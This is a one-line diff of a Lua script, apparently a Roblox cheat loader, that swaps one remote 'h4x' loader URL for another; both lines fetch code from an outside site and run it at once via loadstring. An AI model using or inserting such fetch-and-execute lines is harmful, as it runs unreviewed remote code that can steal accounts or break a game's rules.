@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://h4xscripts.xyz/loader", true))()
+loadstring(game:HttpGet("https://rubuscriptblox.com/script/loader.php?script=h4x", true))()
